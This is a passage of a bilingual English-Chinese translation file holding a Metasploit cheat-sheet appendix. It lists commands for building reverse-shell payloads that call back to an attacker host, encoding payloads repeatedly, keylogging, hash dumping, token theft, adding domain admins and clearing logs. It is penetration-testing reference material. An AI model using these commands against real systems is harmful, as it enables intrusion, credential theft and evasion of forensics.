- en: Appendix B. Cheat Sheet
  id: totrans-0
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 附录B.速查表
- en: Here is a reference for the most frequently used commands and syntax within
    Metasploit’s various interfaces and utilities. See [Meterpreter Post Exploitation
    Commands](part0023.html#meterpreter_post_exploitation_commands) in [MSFencode
    Commands](part0023.html#msfencode_commands) for some all-in-one commands that
    will make your life easier.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 这里是Metasploit各种接口和工具中最常用命令和语法的参考。参见[MSFencode Commands](part0023.html#msfencode_commands)中的[Meterpreter
    Post Exploitation Commands](part0023.html#meterpreter_post_exploitation_commands)，了解一些使您生活更轻松的一站式命令。
- en: MSFconsole Commands
  id: totrans-2
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: MSFconsole 命令
- en: '**`show exploits`**'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: '**`show exploits`**'
- en: Show all exploits within the Framework.
  id: totrans-4
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示框架内所有利用程序。
- en: '**`show payloads`**'
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: '**`show payloads`**'
- en: Show all payloads within the Framework.
  id: totrans-6
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示框架内所有有效载荷。
- en: '**`show auxiliary`**'
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: '**`show auxiliary`**'
- en: Show all auxiliary modules within the Framework.
  id: totrans-8
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示框架内所有辅助模块。
- en: '**`search`** **``*`name`*``**'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: '**`search`** **``*`name`*``**'
- en: Search for exploits or modules within the Framework.
  id: totrans-10
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在框架内搜索利用程序或模块。
- en: '**`info`**'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: '**`info`**'
- en: Load information about a specific exploit or module.
  id: totrans-12
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 加载有关特定利用程序或模块的信息。
- en: '**`use`** **``*`name`*``**'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: '**`use`** **``*`name`*``**'
- en: 'Load an exploit or module (example: `use windows/smb/psexec`).'
  id: totrans-14
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 加载利用程序或模块（例如：`use windows/smb/psexec`）。
- en: '**`LHOST`**'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: '**`LHOST`**'
- en: Your local host’s IP address reachable by the target, often the public IP address
    when not on a local network. Typically used for reverse shells.
  id: totrans-16
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 您的本地主机IP地址，目标可以访问，通常在没有本地网络时是公共IP地址。通常用于反向shell。
- en: '**`RHOST`**'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: '**`RHOST`**'
- en: The remote host or the target.
  id: totrans-18
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 远程主机或目标。
- en: '**`set`** **``*`function`*``**'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: '**`set`** **``*`function`*``**'
- en: Set a specific value (for example, `LHOST` or `RHOST`).
  id: totrans-20
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 设置特定值（例如，`LHOST`或`RHOST`）。
- en: '**`setg`** **``*`function`*``**'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: '**`setg`** **``*`function`*``**'
- en: Set a specific value globally (for example, `LHOST` or `RHOST`).
  id: totrans-22
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在全局范围内设置特定值（例如，`LHOST`或`RHOST`）。
- en: '**`show options`**'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: '**`show options`**'
- en: Show the options available for a module or exploit.
  id: totrans-24
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示模块或利用程序可用的选项。
- en: '**`show targets`**'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: '**`show targets`**'
- en: Show the platforms supported by the exploit.
  id: totrans-26
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示利用程序支持的平台。
- en: '**`set target`** **``*`num`*``**'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: '**`set target`** **``*`num`*``**'
- en: Specify a specific target index if you know the OS and service pack.
  id: totrans-28
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 如果知道操作系统和服务包，指定特定的目标索引。
- en: '**`set payload`** **``*`payload`*``**'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: '**`set payload`** **``*`payload`*``**'
- en: Specify the payload to use.
  id: totrans-30
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 指定要使用的有效载荷。
- en: '**`show advanced`**'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: '**`show advanced`**'
- en: Show advanced options.
  id: totrans-32
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示高级选项。
- en: '**`set autorunscript migrate -f`**'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: '**`set autorunscript migrate -f`**'
- en: Automatically migrate to a separate process upon exploit completion.
  id: totrans-34
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在利用完成后自动迁移到单独的进程。
- en: '**`check`**'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: '**`check`**'
- en: Determine whether a target is vulnerable to an attack.
  id: totrans-36
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 确定目标是否容易受到攻击。
- en: '**`exploit`**'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: '**`exploit`**'
- en: Execute the module or exploit and attack the target.
  id: totrans-38
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 执行模块或利用程序并攻击目标。
- en: '**`exploit -j`**'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: '**`exploit -j`**'
- en: Run the exploit under the context of the job. (This will run the exploit in
    the background.)
  id: totrans-40
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在作业的上下文中运行利用程序。（这将将在后台运行利用程序。）
- en: '**`exploit -z`**'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: '**`exploit -z`**'
- en: Do not interact with the session after successful exploitation.
  id: totrans-42
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在成功利用会话后不要与该会话交互。
- en: '**`exploit -e`** **``*`encoder`*``**'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: '**`exploit -e`** **``*`encoder`*``**'
- en: 'Specify the payload encoder to use (example: `exploit -e shikata_ga_nai`).'
  id: totrans-44
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 指定要使用的有效载荷编码器（例如：`exploit -e shikata_ga_nai`）。
- en: '**`exploit -h`**'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: '**`exploit -h`**'
- en: Display help for the `exploit` command.
  id: totrans-46
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示`exploit`命令的帮助信息。
- en: '**`sessions -l`**'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sessions -l`**'
- en: List available sessions (used when handling multiple shells).
  id: totrans-48
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 列出可用会话（在处理多个shell时使用）。
- en: '**`sessions -l -v`**'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sessions -l -v`**'
- en: List all available sessions and show verbose fields, such as which vulnerability
    was used when exploiting the system.
  id: totrans-50
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 列出所有可用会话并显示详细字段，例如在利用系统时使用了哪种漏洞。
- en: '**`sessions -s`** **``*`script`*``**'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sessions -s`** **``*`script`*``**'
- en: Run a specific Meterpreter script on all Meterpreter live sessions.
  id: totrans-52
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在所有Meterpreter实时会话上运行特定的Meterpreter脚本。
- en: '**`sessions -K`**'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sessions -K`**'
- en: Kill all live sessions.
  id: totrans-54
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 终止所有实时会话。
- en: '**`sessions -c`** **``*`cmd`*``**'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sessions -c`** **``*`cmd`*``**'
- en: Execute a command on all live Meterpreter sessions.
  id: totrans-56
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在所有实时Meterpreter会话上执行命令。
- en: '**`sessions -u`** **``*`sessionID`*``**'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sessions -u`** **``*`sessionID`*``**'
- en: Upgrade a normal Win32 shell to a Meterpreter console.
  id: totrans-58
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 将普通Win32外壳升级到Meterpreter控制台。
- en: '**`db_create`** **``*`name`*``**'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: '**`db_create`** **``*`name`*``**'
- en: 'Create a database to use with database-driven attacks (example: `db_create
    autopwn`).'
  id: totrans-60
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 创建用于数据库驱动攻击的数据库（例如：`db_create autopwn`）。
- en: '**`db_connect`** **``*`name`*``**'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: '**`db_connect`** **``*`name`*``**'
- en: 'Create and connect to a database for driven attacks (example: `db_connect autopwn`).'
  id: totrans-62
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 创建并连接到用于驱动攻击的数据库（例如：`db_connect autopwn`）。
- en: '**`db_nmap`**'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: '**`db_nmap`**'
- en: Use *nmap* and place results in database. (Normal *nmap* syntax is supported,
    such as `-sT -v -P0`.)
  id: totrans-64
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 *nmap* 并将结果放入数据库。（支持正常的 *nmap* 语法，例如 `-sT -v -P0`。）
- en: '**`db_autopwn -h`**'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: '**`db_autopwn -h`**'
- en: Display help for using `db_autopwn`.
  id: totrans-66
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示使用 `db_autopwn` 的帮助。
- en: '**`db_autopwn -p -r -e`**'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: '**`db_autopwn -p -r -e`**'
- en: Run `db_autopwn` against all ports found, use a reverse shell, and exploit all
    systems.
  id: totrans-68
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 对找到的所有端口运行 `db_autopwn`，使用反向 shell 并利用所有系统。
- en: '**`db_destroy`**'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: '**`db_destroy`**'
- en: Delete the current database.
  id: totrans-70
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 删除当前数据库。
- en: '**`db_destroy`** **``*`user:password@host:port/database`*``**'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: '**`db_destroy`** **``*`user:password@host:port/database`*``**'
- en: Delete database using advanced options.
  id: totrans-72
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用高级选项删除数据库。
- en: Meterpreter Commands
  id: totrans-73
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Meterpreter 命令
- en: '**`help`**'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: '**`help`**'
- en: Open Meterpreter usage help.
  id: totrans-75
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 打开 Meterpreter 使用帮助。
- en: '**`run`** **``*`scriptname`*``**'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: '**`run`** **``*`scriptname`*``**'
- en: Run Meterpreter-based scripts; for a full list check the *scripts/meterpreter*
    directory.
  id: totrans-77
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 运行基于 Meterpreter 的脚本；完整列表请查看 *scripts/meterpreter* 目录。
- en: '**`sysinfo`**'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sysinfo`**'
- en: Show the system information on the compromised target.
  id: totrans-79
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示受攻击目标上的系统信息。
- en: '**`ls`**'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: '**`ls`**'
- en: List the files and folders on the target.
  id: totrans-81
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 列出目标上的文件和文件夹。
- en: '**`use priv`**'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: '**`use priv`**'
- en: Load the privilege extension for extended Meterpreter libraries.
  id: totrans-83
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 加载扩展 Meterpreter 库的权限扩展。
- en: '**`ps`**'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: '**`ps`**'
- en: Show all running processes and which accounts are associated with each process.
  id: totrans-85
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示所有正在运行的过程以及与每个进程关联的账户。
- en: '**`migrate`** **``*`PID`*``**'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: '**`migrate`** **``*`PID`*``**'
- en: Migrate to the specific process ID (PID is the target process ID gained from
    the `ps` command).
  id: totrans-87
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 迁移到特定的进程 ID（PID 是从 `ps` 命令中获取的目标进程 ID）。
- en: '**`use incognito`**'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: '**`use incognito`**'
- en: Load *incognito* functions. (Used for token stealing and impersonation on a
    target machine.)
  id: totrans-89
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 加载 *incognito* 函数。（用于在目标机器上窃取令牌和模拟。）
- en: '**`list_tokens -u`**'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: '**`list_tokens -u`**'
- en: List available tokens on the target by user.
  id: totrans-91
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 按用户列出目标上的可用令牌。
- en: '**`list_tokens -g`**'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '**`list_tokens -g`**'
- en: List available tokens on the target by group.
  id: totrans-93
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 按组列出目标上的可用令牌。
- en: '**`impersonate_token DOMAIN_NAME\\USERNAME`**'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: '**`impersonate_token DOMAIN_NAME\\USERNAME`**'
- en: Impersonate a token available on the target.
  id: totrans-95
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 模拟目标上可用的令牌。
- en: '**`steal_token`** **``*`PID`*``**'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: '**`steal_token`** **``*`PID`*``**'
- en: Steal the tokens available for a given process and impersonate that token.
  id: totrans-97
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 窃取给定进程可用的令牌并模拟该令牌。
- en: '**`drop_token`**'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: '**`drop_token`**'
- en: Stop impersonating the current token.
  id: totrans-99
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 停止模拟当前令牌。
- en: '**`getsystem`**'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: '**`getsystem`**'
- en: Attempt to elevate permissions to SYSTEM-level access through multiple attack
    vectors.
  id: totrans-101
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 通过多个攻击向量尝试提升权限到 SYSTEM 级别访问。
- en: '**`shell`**'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: '**`shell`**'
- en: Drop into an interactive shell with all available tokens.
  id: totrans-103
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用所有可用的令牌进入交互式 shell。
- en: '**`execute -f cmd.exe -i`**'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: '**`execute -f cmd.exe -i`**'
- en: Execute *cmd.exe* and interact with it.
  id: totrans-105
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 执行 *cmd.exe* 并与之交互。
- en: '**`execute -f cmd.exe -i -t`**'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: '**`execute -f cmd.exe -i -t`**'
- en: Execute *cmd.exe* with all available tokens.
  id: totrans-107
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用所有可用的令牌执行 *cmd.exe*。
- en: '**`execute -f cmd.exe -i -H -t`**'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: '**`execute -f cmd.exe -i -H -t`**'
- en: Execute *cmd.exe* with all available tokens and make it a hidden process.
  id: totrans-109
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用所有可用的令牌执行 *cmd.exe* 并将其设置为隐藏进程。
- en: '**`rev2self`**'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: '**`rev2self`**'
- en: Revert back to the original user you used to compromise the target.
  id: totrans-111
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 回退到最初用于攻击目标的用户。
- en: '**`reg`** **``*`command`*``**'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: '**`reg`** **``*`command`*``**'
- en: Interact, create, delete, query, set, and much more in the target’s registry.
  id: totrans-113
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在目标注册表中交互、创建、删除、查询、设置等。
- en: '**`setdesktop`** **``*`number`*``**'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: '**`setdesktop`** **``*`number`*``**'
- en: Switch to a different screen based on who is logged in.
  id: totrans-115
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 根据登录用户切换到不同的屏幕。
- en: '**`screenshot`**'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: '**`screenshot`**'
- en: Take a screenshot of the target’s screen.
  id: totrans-117
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 捕获目标屏幕的截图。
- en: '**`upload`** **``*`file`*``**'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: '**`upload`** **``*`file`*``**'
- en: Upload a file to the target.
  id: totrans-119
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 将文件上传到目标。
- en: '**`download`** **``*`file`*``**'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: '**`download`** **``*`file`*``**'
- en: Download a file from the target.
  id: totrans-121
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 从目标下载文件。
- en: '**`keyscan_start`**'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: '**`keyscan_start`**'
- en: Start sniffing keystrokes on the remote target.
  id: totrans-123
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在远程目标上开始按键记录。
- en: '**`keyscan_dump`**'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: '**`keyscan_dump`**'
- en: Dump the remote keys captured on the target.
  id: totrans-125
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在目标上转储捕获的远程密钥。
- en: '**`keyscan_stop`**'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: '**`keyscan_stop`**'
- en: Stop sniffing keystrokes on the remote target.
  id: totrans-127
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在远程目标上停止按键记录。
- en: '**`getprivs`**'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: '**`getprivs`**'
- en: Get as many privileges as possible on the target.
  id: totrans-129
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在目标上获取尽可能多的权限。
- en: '**`uictl enable keyboard/mouse`**'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: '**`uictl enable keyboard/mouse`**'
- en: Take control of the keyboard and/or mouse.
  id: totrans-131
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 控制键盘和/或鼠标。
- en: '**`background`**'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: '**`background`**'
- en: Run your current Meterpreter shell in the background.
  id: totrans-133
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在后台运行当前的 Meterpreter shell。
- en: '**`hashdump`**'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: '**`hashdump`**'
- en: Dump all hashes on the target.
  id: totrans-135
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在目标上转储所有哈希值。
- en: '**`use sniffer`**'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: '**`use sniffer`**'
- en: Load the sniffer module.
  id: totrans-137
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 加载嗅探模块。
- en: '**`sniffer_interfaces`**'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sniffer_interfaces`**'
- en: List the available interfaces on the target.
  id: totrans-139
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 列出目标上的可用接口。
- en: '**`sniffer_dump`** **``*`interfaceID pcapname`*``**'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sniffer_dump`** **``*`interfaceID pcapname`*``**'
- en: Start sniffing on the remote target.
  id: totrans-141
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在远程目标上开始嗅探。
- en: '**`sniffer_start`** **``*`interfaceID packet-buffer`*``**'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sniffer_start`** **``*`interfaceID packet-buffer`*``**'
- en: Start sniffing with a specific range for a packet buffer.
  id: totrans-143
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用特定的数据包缓冲区范围开始嗅探。
- en: '**`sniffer_stats`** **``*`interfaceID`*``**'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sniffer_stats`** **``*`interfaceID`*``**'
- en: Grab statistical information from the interface you are sniffing.
  id: totrans-145
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 从您正在嗅探的接口获取统计信息。
- en: '**`sniffer_stop`** **``*`interfaceID`*``**'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sniffer_stop`** **``*`interfaceID`*``**'
- en: Stop the sniffer.
  id: totrans-147
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 停止嗅探。
- en: '**`add_user`** **``*`username password`*``** **`-h`** **``*`ip`*``**'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: '**`add_user`** **``*`username password`*``** **`-h`** **``*`ip`*``**'
- en: Add a user on the remote target.
  id: totrans-149
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在远程目标上添加用户。
- en: '**`add_group_user "Domain Admins"`** **``*`username`*``** **`-h`** **``*`ip`*``**'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: '**`add_group_user "Domain Admins"`** **``*`username`*``** **`-h`** **``*`ip`*``**'
- en: Add a username to the *Domain Administrators* group on the remote target.
  id: totrans-151
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在远程目标上将用户名添加到 *Domain Administrators* 组。
- en: '**`clearev`**'
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: '**`clearev`**'
- en: Clear the event log on the target machine.
  id: totrans-153
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 清除目标机器上的事件日志。
- en: '**`timestomp`**'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: '**`timestomp`**'
- en: Change file attributes, such as creation date (antiforensics measure).
  id: totrans-155
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 修改文件属性，例如创建日期（反取证措施）。
- en: '**`reboot`**'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: '**`reboot`**'
- en: Reboot the target machine.
  id: totrans-157
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 重启目标机器。
- en: MSFpayload Commands
  id: totrans-158
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: MSFpayload 命令
- en: '**`msfpayload -h`**'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload -h`**'
- en: List available payloads.
  id: totrans-160
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 列出可用的有效载荷。
- en: '**`msfpayload windows/meterpreter/bind_tcp O`**'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload windows/meterpreter/bind_tcp O`**'
- en: List available options for the `windows/meterpreter/bind_tcp` payload (all of
    these can use any payload).
  id: totrans-162
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 列出 `windows/meterpreter/bind_tcp` 有效载荷的可用选项（所有这些都可以使用任何有效载荷）。
- en: '**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X
    > payload.exe`**'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X
    > payload.exe`**'
- en: Create a Meterpreter *reverse_tcp* payload to connect back to 192.168.1.5 and
    on port 443, and then save it as a Windows Portable Executable named *payload.exe*.
  id: totrans-164
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 创建一个连接回 192.168.1.5 并在端口 443 的 *reverse_tcp* Meterpreter 有效载荷，并将其保存为名为 *payload.exe*
    的 Windows 可移植可执行文件。
- en: '**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R
    > payload.raw`**'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R
    > payload.raw`**'
- en: Same as above, but export as raw format. This will be used later in *msfencode*.
  id: totrans-166
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 与上面相同，但以原始格式导出。这将在 *msfencode* 中稍后使用。
- en: '**`msfpayload windows/meterpreter/bind_tcp LPORT=443 C > payload.c`**'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload windows/meterpreter/bind_tcp LPORT=443 C > payload.c`**'
- en: Same as above but export as C-formatted shellcode.
  id: totrans-168
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 与上面相同，但以 C 格式的 shellcode 导出。
- en: '**`msfpayload windows/meterpreter/bind_tcp LPORT=443 J > payload.java`**'
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload windows/meterpreter/bind_tcp LPORT=443 J > payload.java`**'
- en: Export as *%u encoded* JavaScript.
  id: totrans-170
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 以 *%u 编码* 的 JavaScript 格式导出。
- en: MSFencode Commands
  id: totrans-171
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: MSFencode 命令
- en: '**`msfencode -h`**'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfencode -h`**'
- en: Display the *msfencode* help.
  id: totrans-173
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 显示 *msfencode* 帮助。
- en: '**`msfencode -l`**'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfencode -l`**'
- en: List the available encoders.
  id: totrans-175
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 列出可用的编码器。
- en: '**`msfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs,
    loop-vbs, asp, war, macho)`**'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs,
    loop-vbs, asp, war, macho)`**'
- en: Format to display the encoded buffer.
  id: totrans-177
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 以显示编码缓冲区的格式。
- en: '**`msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c
    5 -t exe`**'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c
    5 -t exe`**'
- en: Encode `payload.raw` with `shikata_ga_nai` five times and export it to an output
    file named *encoded_payload.exe*.
  id: totrans-179
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 `shikata_ga_nai` 对 `payload.raw` 进行五次编码，并将其导出到名为 *encoded_payload.exe* 的输出文件。
- en: '**`msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/_countdown
    -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe`**'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: '**`msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/_countdown
